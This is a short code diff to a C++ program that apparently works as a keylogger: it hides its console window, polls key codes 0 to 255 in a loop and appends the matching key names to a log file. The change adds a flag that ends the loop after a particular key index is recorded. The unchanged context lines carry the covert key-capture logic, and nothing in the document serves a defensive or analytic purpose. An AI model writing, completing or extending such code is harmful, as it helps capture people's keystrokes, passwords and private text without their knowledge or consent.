@@ -18,7 +18,11 @@ int main() {
     FreeConsole();
     int n = 9;
     ofstream arq;
+    bool exit = false;
     while (true) {
+        if (exit) {
+            break;
+        }
         Sleep(10);
         for (int i = 0; i <= 255; i++) {
 
@@ -31,6 +35,9 @@ int main() {
                         arq.open(s.c_str(), ios::app);
                         arq << kn[ii] << endl;
                         arq.close();
+                        if (ii == 5) {
+                            exit = true;
+                        }
                         //cout << kn[ii] << endl;
                         yay = false;
                     }
